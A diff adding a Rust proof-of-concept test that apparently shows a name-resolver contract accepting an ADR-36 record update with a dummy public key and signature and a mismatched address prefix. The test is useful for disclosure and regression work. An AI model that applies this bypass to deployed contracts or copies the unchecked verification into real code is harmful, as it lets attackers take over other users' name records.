@@ -305,3 +305,64 @@ fn eth_address_set_record() {
         )
     .unwrap();
 }
+
+#[test]
+fn adr36_verification_bypass() {
+    let admin1 = String::from("admin1");
+    let admin2 = String::from("admin2");
+    let admins = vec![admin1, admin2];
+    let registrar = String::from("default-registrar");
+
+    // first instantiate name nft
+    let (name_nft_contract, mut app) = instantiate_name_nft(admins, registrar.clone());
+
+    // now instantiate resolver using name nft contract
+    let resolver_contract_addr =
+        instantiate_resolver_with_name_nft(&mut app, name_nft_contract.clone());
+
+    let addr = cosmos_pubkey_to_bech32_address(signer1().to_binary(), "osmo".to_string());
+
+    // use invalid pub key and signature
+    let pub_key_bytes = hex!("aaaa");
+    let signature_bytes = hex!("bbbb");
+    let pub_key = Binary::from(pub_key_bytes.clone());
+    let signature = Binary::from(signature_bytes.clone());
+
+    let mint = app
+        .execute_contract(
+            Addr::unchecked(registrar.clone()),
+            name_nft_contract,
+            &NameExecuteMsg::CW721Base(CW721BaseExecuteMsg::<Extension, Empty>::Mint(MintMsg {
+                token_id: "alice".to_string(),
+                owner: addr.to_string(),
+                token_uri: None,
+                extension: None,
+            })),
+            &[],
+        )
+        .is_err();
+    assert_eq!(mint, false);
+
+    // use address with different bech32 prefix
+    let different_bech32_prefix_address = cosmos_pubkey_to_bech32_address(signer1().to_binary(), "cosmos".to_string());
+    let record_msg = ExecuteMsg::SetRecord {
+        name: "alice".to_string(),
+        bech32_prefix: "cosmos".to_string(),
+        adr36_info: Adr36Info {
+            signer_bech32_address: different_bech32_prefix_address.to_string(),
+            address_hash: msg::AddressHash::Ethereum,
+            pub_key: pub_key.clone(),
+            signature: signature,
+            signature_salt: 12313u128.into(),
+        }, 
+    };
+
+    app
+        .execute_contract(
+            Addr::unchecked(addr),
+            resolver_contract_addr,
+            &record_msg,
+            &[],
+        )
+        .unwrap();
+}
